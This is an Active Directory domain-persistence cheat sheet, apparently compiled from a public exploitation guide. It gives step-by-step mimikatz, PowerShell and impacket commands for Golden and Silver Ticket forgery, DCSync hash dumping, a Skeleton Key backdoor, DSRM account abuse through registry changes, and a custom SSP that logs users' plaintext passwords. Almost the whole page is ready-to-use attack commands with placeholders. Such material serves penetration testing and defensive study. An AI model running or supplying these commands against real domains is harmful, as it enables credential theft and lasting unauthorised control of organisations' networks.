# Active Directory Domain Persistence

## Domain Persistence

### Golden Ticket Attack

Execute mimikatz on DC as DA to grab krbtgt hash:

```text
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <DC'sName>
```

On any machine:

```text
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DomainName> /sid:<Domain's SID> /krbtgt:
<HashOfkrbtgtAccount>   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

### DCsync Attack

DCSync Privileges:

```text
$SecPassword = ConvertTo-SecureString 'username123$!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\username', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity username -Rights DCSync
```

DCsync using mimikatz \(You need DA rights or DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges\):

```text
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DomainName>\<AnyDomainUser>"'
```

DCsync using secretsdump.py from impacket with NTLM authentication

```text
secretsdump.py <Domain>/<Username>:<Password>@<DC'S IP or FQDN> -just-dc-ntlm
impacket-secretsdump htb.local/username@10.10.10.161
```

DCsync using secretsdump.py from impacket with Kerberos Authentication

```text
secretsdump.py -no-pass -k <Domain>/<Username>@<DC'S IP or FQDN> -just-dc-ntlm
```

> **Tip:** 
>
>  /ptt -&gt; inject ticket on current running session 
>
>  /ticket -&gt; save the ticket on the system for later use

### Silver Ticket Attack

```text
Invoke-Mimikatz -Command '"kerberos::golden /domain:<DomainName> /sid:<DomainSID> /target:<TheTargetMachine> /service:
<ServiceType> /rc4:<TheSPN's Account NTLM Hash> /user:<UserToImpersonate> /ptt"'
```

[SPN List](https://adsecurity.org/?page_id=183)

### Skeleton Key Attack

Exploitation Command ran as DA:

```text
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DC's FQDN>
```

Access using the password "mimikatz"

```text
Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
```

### DSRM Abuse

_What is this?: Every DC has a local Administrator account, this accounts has the DSRM password which is a SafeBackupPassword. We can get this and then pth its NTLM hash to get local Administrator access to DC!_

Dump DSRM password \(needs DA privileges\):

```text
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName <DC's Name>
```

This is a local account, so we can PTH and authenticate but we need to alter the behavior of the DSRM account before PTH:

1. Connect on DC:

   ```text
   Enter-PSSession -ComputerName <DC's Name>
   ```

2. Alter the Logon behavior on the registry:

   ```text
   New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD -Verbose
   ```

3. If the property already exists:

   ```text
   Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -Verbose
   ```

Then just PTH to get local admin access on DC!

### Custom SSP

_What is this?: We can set our on SSP by dropping a custom dll, for example mimilib.dll from mimikatz, that will monitor and capture plaintext passwords from users that logged on!_

Get current Security Package:

```text
$packages = Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' | select -ExpandProperty  'Security Packages'
```

Append mimilib:

```text
$packages += "mimilib"
```

Change the new packages name

```text
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' -Value $packages
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name 'Security Packages' -Value $packages
```

Alternative solution:

```text
Invoke-Mimikatz -Command '"misc::memssp"'
```

Now all logons on the DC are logged to -&gt; `C:\Windows\System32\kiwissp.log`

## Reference

{% embed url="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet/blob/master/README.md\#domain-persistence" %}





